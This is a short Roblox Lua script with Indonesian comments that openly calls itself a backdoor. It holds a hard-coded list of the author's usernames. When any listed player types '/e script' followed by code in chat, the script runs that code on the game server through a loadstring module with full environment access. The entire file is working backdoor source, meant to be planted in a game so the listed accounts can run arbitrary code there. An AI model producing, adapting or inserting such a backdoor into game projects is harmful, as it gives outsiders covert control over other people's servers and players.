-- Pintu belakang untuk orang keren
-- Dibuat oleh MrMadMan (interpreterK)
-- Cara menggunakan: /e script [skrip]

local Akses = {
    "interpreterK",
    "MrMadMan139",
    --akun alternatif saya
    "realwar2d",
    "B01RING",
    --milikmu
    "putra_mahesa1"
}

local function Obrolan(str, P)
    local pisah = str:split(' ')
    local perintah = pisah[1] and pisah[1]:lower() == "/e"
    local aksi = pisah[2] and pisah[2]:lower() == "script"
    
    if perintah and aksi then
        local ls = require(script.Loadstring)
        --menambahkan dukungan pemilik dari game saya agar tidak perlu menulis nama Anda terus-menerus (owner.Name, owner.UserId, dll)
        local sumber  = ls(pisah[3], setmetatable({owner = P}, {
            __index = function(self,v)
                return rawget(self,v) or getfenv()[v]
            end,
            __newindex = function(self,i,v)
                getfenv()[i]=v
            end,
            __metatable = nil --jika skrip yang Anda jalankan atau sesuatu yang mencurigakan terjadi;
        }))
        pcall(sumber)
    end
end

game:GetService("Players").PlayerAdded:Connect(function(P)
    for i = 1, #Akses do
        if P.Name == Akses[i] then
            P.Chatted:Connect(function(...)
                Obrolan(..., P)
            end)
            break
        end
    end
end)
